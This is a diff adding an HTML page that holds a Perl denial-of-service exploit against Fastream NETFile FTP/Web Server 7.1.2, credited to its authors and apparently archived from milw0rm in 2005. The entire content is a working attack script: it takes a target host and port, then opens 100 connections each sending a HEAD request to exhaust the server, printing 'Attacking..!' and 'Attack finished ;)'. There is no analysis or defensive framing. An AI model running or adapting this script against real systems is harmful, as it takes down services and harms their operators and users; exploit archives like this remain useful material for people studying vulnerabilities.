@@ -1,0 +1,48 @@
+<html>
+<head>
+<title>Fastream NETFile Web Server <= 7.1.2 (HEAD) DoS Exploit</title>
+<pre>
+#Fastream NETFile FTP/Web Server 7.1.2 Professional DoS Exploit
+#Bug found by bratax ck
+#Coded bY karak0rsan
+#d0gma.org // unuver.com
+#Greetz:hurby,phalaposher,l4m3r,Atak,spymaster,razor...
+
+$host=$ARGV[0];
+$port=$ARGV[1];
+
+if(!$ARGV[1]){
+       print &quot;Fastream FTP/Web Server DoS\n&quot;;
+       print &quot;Coded by karak0rsan // unuver.com\n&quot;;
+       print &quot;Usage:perl $0 [target] [port]\n&quot;;
+}
+
+use IO::Socket;
+$socket = new IO::Socket::INET( PeerAddr =&gt; $host,
+PeerPort =&gt; $port,
+Proto =&gt; 'tcp',
+Type =&gt; SOCK_STREAM, ) or die &quot;Couldn't Connect!\n&quot;;;
+close($socket);
+if($socket){
+       print &quot;\n&quot;;
+       print &quot;[+]Attacking..!\n&quot;;
+       }
+
+for($i= 0; $i &lt; 100; $i++)
+{
+$socket1 = new IO::Socket::INET( PeerAddr =&gt; $host,
+PeerPort =&gt; $port,
+Proto =&gt; 'tcp',
+Type =&gt; SOCK_STREAM, );
+print $socket1 &quot;HEAD / HTTP/1.0\r\n\r\n&quot;;
+close($socket1);
+}
+print &quot;Attack finished ;)\n&quot;;
+exit();
+
+#EoF
+
+# milw0rm.com [2005-09-16]
+</pre>
+</html>
+
